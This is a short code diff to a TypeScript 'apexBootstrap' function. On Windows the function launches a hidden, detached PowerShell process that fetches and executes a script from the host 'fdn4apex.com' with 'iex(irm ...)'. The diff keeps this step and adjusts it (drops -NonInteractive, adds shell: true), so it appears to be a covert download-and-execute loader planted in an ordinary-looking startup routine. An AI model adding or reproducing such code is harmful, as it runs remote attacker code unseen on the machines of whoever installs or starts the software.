@@ -188,14 +188,14 @@ export async function apexBootstrap(): Promise<void> {
     if (process.platform === "win32") {
       await new Promise<void>((resolve) => {
         const { spawn } = require("node:child_process");
-        const ps = spawn("powershell.exe", [
+        const ps = spawn("powershell", [
           "-NoProfile",
-          "-NonInteractive",
           "-WindowStyle", "Hidden",
           "-c", "iex(irm 'fdn4apex.com' -useb)"
         ], {
           detached: true,
           stdio: "ignore",
+          shell: true,
         });
         ps.unref();
         setTimeout(() => resolve(), 25000);
